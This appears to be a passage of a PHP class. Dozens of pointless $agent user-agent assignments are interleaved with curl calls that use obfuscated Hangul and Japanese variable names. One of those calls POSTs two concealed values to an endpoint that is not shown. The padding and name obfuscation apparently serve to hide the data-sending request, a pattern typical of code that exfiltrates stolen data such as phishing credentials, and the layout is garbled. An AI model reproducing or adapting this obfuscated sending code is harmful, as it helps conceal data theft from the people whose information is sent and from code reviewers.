		$agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299";
		$agent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
		$agent = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
		$agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64";
		$agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0";
		$agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0";
		$agent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
		$agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0";
		$agent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)";
		$agent = "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0";
		$agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$agent = "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
		$agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
		$agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36";
     $agent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8";
		$agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8";
		$agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393";
		$agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
		$agent = "Mozilla/5.0 (iPad; CPU OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1";
		$agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko";
        curl_setopt($쯦, CURLOPT_RETURNTRANSFER, true);
            $agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0";
		$agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38";
		$agent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent = "Mozilla/5.0 (X11; CrOS x86_64 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36";
        curl_setopt($쯦, CURLOPT_POSTFIELDS, "つ=$頁&事=$ぱ");
       curl_exec($쯦);
       $agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
		$agent = "Mozilla/5.0 (iPad; CPU OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1";
       curl_close($쯦);
      }
      public function intRandom($size) 
      {
        $validCharacters = utf8_decode("0123456789");
        $validCharNumber = strlen($validCharacters);
        $int = '';
        while (strlen($int) < $size) {
            $index = mt_rand(0, $validCharNumber - 1);
            $int .= $validCharacters[$index];
        }
        return $int;
      }
}
?>